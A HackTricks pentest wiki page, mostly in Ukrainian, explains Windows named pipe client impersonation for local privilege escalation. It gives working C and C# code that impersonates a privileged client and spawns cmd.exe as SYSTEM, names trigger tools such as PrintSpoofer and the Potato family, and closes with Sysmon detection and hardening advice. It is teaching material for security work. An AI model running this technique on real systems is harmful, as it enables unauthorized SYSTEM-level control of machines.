# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation — це примітив локального підвищення привілеїв, який дозволяє серверному потоку named-pipe прийняти контекст безпеки клієнта, який підключається до нього. На практиці, атака, що може виконувати код з правами SeImpersonatePrivilege, може змусити привілейований компонент (наприклад, службу SYSTEM) підключитися до контрольованого атакуючим pipe, викликати ImpersonateNamedPipeClient, продублювати отриманий токен у primary token і запустити процес від імені клієнта (часто NT AUTHORITY\SYSTEM).

Ця сторінка зосереджена на основній техніці. Для повних ланцюжків експлойтів, що змушують SYSTEM підключитися до вашого pipe, див. сторінки родини Potato, згадані нижче.

## Коротко
- Create a named pipe: \\.\pipe\<random> і очікуйте підключення.
- Змусіть привілейований компонент підключитися до нього (spooler/DCOM/EFSRPC/etc.).
- Прочитайте принаймні одне повідомлення з pipe, після чого викличте ImpersonateNamedPipeClient.
- Відкрийте impersonation token поточного потоку, DuplicateTokenEx(TokenPrimary) та використайте CreateProcessWithTokenW/CreateProcessAsUser для отримання процесу SYSTEM.

## Вимоги та ключові API
- Привілеї, що зазвичай потрібні викликаючому процесу/потоку:
- SeImpersonatePrivilege для успішної імперсонації підключеного клієнта та для використання CreateProcessWithTokenW.
- Альтернативно, після імперсонації SYSTEM, можна використати CreateProcessAsUser, що може вимагати SeAssignPrimaryTokenPrivilege і SeIncreaseQuotaPrivilege (ці права задовольняються, коли ви імперсонували SYSTEM).
- Основні API, що використовуються:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (треба прочитати принаймні одне повідомлення перед імперсонацією)
- ImpersonateNamedPipeClient та RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW або CreateProcessAsUser
- Рівень імперсонації: щоб виконувати корисні дії локально, клієнт повинен дозволяти SecurityImpersonation (за замовчуванням для багатьох локальних RPC/named-pipe клієнтів). Клієнти можуть понижувати це, використовуючи SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION при відкритті pipe.

## Мінімальний Win32 робочий процес (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Примітки:
- Якщо ImpersonateNamedPipeClient повертає ERROR_CANNOT_IMPERSONATE (1368), переконайтеся, що ви спочатку читаєте з pipe і що клієнт не обмежив impersonation до Identification level.
- Віддавайте перевагу DuplicateTokenEx з SecurityImpersonation і TokenPrimary для створення первинного токена, придатного для створення процесу.

## .NET швидкий приклад
У .NET NamedPipeServerStream може виконувати impersonate через RunAsClient. Після impersonate дублюйте thread token і створіть процес.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Загальні тригери/примуси, щоб отримати SYSTEM до вашого pipe
Ці техніки примушують привілейовані служби підключитися до вашого named pipe, щоб ви могли impersonate їх:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Усунення проблем і нюанси
- Потрібно прочитати щонайменше одне повідомлення з pipe перед викликом ImpersonateNamedPipeClient; інакше ви отримаєте ERROR_CANNOT_IMPERSONATE (1368).
- Якщо клієнт підключається з SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, сервер не зможе повністю impersonate; перевірте рівень impersonation токена через GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW вимагає наявності SeImpersonatePrivilege у викликача. Якщо це невдається з ERROR_PRIVILEGE_NOT_HELD (1314), використовуйте CreateProcessAsUser після того, як ви вже impersonated SYSTEM.
- Переконайтеся, що security descriptor вашого pipe дозволяє цільовій службі підключатися, якщо ви його посилюєте; за замовчуванням, pipes під \\.\pipe доступні згідно з DACL сервера.

## Виявлення та hardening
- Моніторьте створення та підключення named pipe. Sysmon Event IDs 17 (Pipe Created) і 18 (Pipe Connected) корисні для встановлення базової лінії легітимних імен pipe і виявлення незвичних, випадковоподібних pipe перед подіями маніпуляції токенами.
- Шукайте послідовності: процес створює pipe, служба SYSTEM підключається, потім процес-створювач породжує дочірній процес у контексті SYSTEM.
- Зменшіть ризик, видаливши SeImpersonatePrivilege з неключових облікових записів служб та уникаючи непотрібних логонів служб з високими привілеями.
- Захисна розробка: при підключенні до ненадійних named pipe вказуйте SECURITY_SQOS_PRESENT з SECURITY_IDENTIFICATION, щоб перешкодити серверам повністю impersonate клієнта, якщо це не потрібно.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
